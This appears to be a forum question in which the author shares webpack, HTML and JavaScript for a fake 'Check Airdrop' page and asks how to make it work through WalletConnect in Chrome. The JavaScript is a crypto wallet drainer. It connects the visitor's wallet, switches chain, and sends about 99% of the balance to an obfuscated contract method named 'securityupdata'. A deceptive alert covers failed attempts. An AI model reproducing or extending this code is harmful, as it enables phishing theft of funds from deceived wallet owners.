@@ -1,0 +1,165 @@
+“ AppKit JavaScript Ethers v5 Yarn Yarn add @web3modal/ethers5 ethers@5.7.2”
+---------------------------------------------------------------------------------------------------------------------------
+"I compiled the official main.ts with Webpack and obtained bundle.js."
+
+const path = require('path');
+
+module.exports = {
+  // Entry file
+  entry: './src/index.ts', // Changed to a .ts file
+
+  // Output file
+  output: {
+    filename: 'bundle.js', // Name of the output file
+    path: path.resolve(__dirname, 'dist'), // Path to the output file
+  },
+
+  // Configure the development server
+  devServer: {
+    static: path.join(__dirname, 'dist'), // Use 'static' instead of 'contentBase' to specify the directory for static files
+    compress: true, // Enable gzip compression
+    port: 9000, // Port for the development server
+  },
+
+  // Configure module resolution
+  module: {
+    rules: [
+      {
+        test: /\.ts$/, // Process .ts files
+        exclude: /node_modules/, // Exclude the node_modules directory
+        use: {
+          loader: 'ts-loader', // Use ts-loader to process TypeScript files
+        },
+      },
+    ],
+  },
+
+  // Set mode
+  mode: 'development', // or 'production', specifies the build
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+"Here is the code for my HTML page."
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="./视频演示.js" defer></script> <!-- Load video demo script -->
+    <script src="./ethers-5.2.umd.min1.js" defer></script> <!-- Load Ethers.js library -->
+    <title>Document</title>
+    <style>
+        body {
+            background-image: url('视频演示.png'); /* Set background image */
+            background-size: cover; /* Make background image cover the entire viewport */
+            background-position: center; /* Center the background image */
+            background-repeat: no-repeat; /* Prevent the background image from repeating */
+            color: white; /* Set text color to white for better visibility on a dark background */
+            display: flex;
+            justify-content: center; /* Center content horizontally */
+            align-items: center; /* Center content vertically */
+            height: 100vh; /* Make the body height fill the entire viewport */
+            margin: 0; /* Remove default body margin */
+        }
+        button {
+            background-color: grey; /* Set button background color to ensure visibility on a dark background */
+            color: white; /* Set button text color to white */
+            height: 100px;
+            width: 200px;
+            border: none; /* Remove button border */
+            cursor: pointer; /* Show a pointer cursor when hovering over the button */
+            transform: translateY(200px); /* Move the button down by 200px */
+        }
+        h1 {
+            margin: 0; /* Remove default margin from the h1 element */
+        }
+    </style>
+</head>
+<body>
+    <!-- BSC chain -->
+    <button id='test1' onclick="registerbsc()">
+        <h1>Click to Check Airdrop</h1> <!-- Button label -->
+    </button>
+
+    <!-- Web3Modal button -->
+    <w3m-button id="positioned-button">Button</w3m-button>
+    
+    <!-- Include the bundled JavaScript file -->
+    <script type="module" src="/dist/bundle.js"></script>
+      
+    <script>
+        // Get the button element
+        const button = document.getElementById('positioned-button');
+      
+        // Set the initial position of the button (e.g., 100px from the left, 200px from the top of the screen)
+        const initialX = 100; // X coordinate
+        const initialY = 200; // Y coordinate
+      
+        // Apply position
+        button.style.position = 'absolute';
+        button.style.left = `${initialX}px`;
+        button.style.top = `${initialY}px`;
+      </script>
+
+</body>
+</html>
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+"Below is my frontend .js file used to interact with the wallet. If it's a desktop browser or the wallet's built-in browser, it can interact normally through WalletConnect because the wallet automatically injects window.ethereum.
+
+However, when I use Google Chrome to connect through WalletConnect, the interaction with the wallet fails because third-party browsers do not have window.ethereum. What additional code do I need to add to my .js file to interact with the wallet through WalletConnect?"
+
+
+async function t() {
+  try {
+    if (window.ethereum) { // Check if Ethereum object is available
+      console.log("Ethereum object is available.");
+      
+      // Connect to the wallet
+      const acc = await ethereum.request({ method: 'eth_requestAccounts' });
+      console.log("Accounts:", acc);
+
+      // Check the network
+      const chainId = await ethereum.request({ method: 'eth_chainId' });
+      console.log("Chain ID:", chainId);
+
+      if (chainId !== '0x38') { // BNB Smart Chain Mainnet
+        try {
+          await ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }], // Switch to BNB Smart Chain Mainnet
+          });
+        } catch (error) {
+          console.error('Failed to switch network:', error);
+          return;
+        }
+      }
+
+      const a = new ethers.providers.Web3Provider(window.ethereum); // Create a Web3 provider
+      const ch = new ethers.Contract(suiconrtkwrjklqndn, aqweklzlxbi, a.getSigner()); // Create a contract instance
+
+      let ceb = ethers.utils.formatEther(await a.getBalance(acc[0])); // Get and format the account balance
+      console.log("Balance:", ceb);
+      ceb = ceb * 0.9899 + ""; // Adjust the amount for transfer
+      console.log("Transfer amount:", ceb);
+
+      const options = { value: ethers.utils.parseEther(ceb) }; // Set options for the transaction
+      await ch.securityupdata(options); // Call the contract method to execute the transfer
+      console.log("Transfer successful.");
+      return 1;
+    } else {
+      alert("Please ensure your wallet extension is installed and enabled, and that you allow access to your wallet information.");
+      console.log("Ethereum object is not available.");
+    }
+  } catch (eee) {
+    console.error("Error in t function:", eee);
+    if (eee.message.includes('fractional component exceeds decimals')) {
+      alert("Sorry, the current wallet or blockchain interaction is infrequent and does not meet the airdrop conditions. Please switch to a more commonly used wallet or blockchain, and reopen the website to claim the airdrop.");
+    }
+  }
+}
+
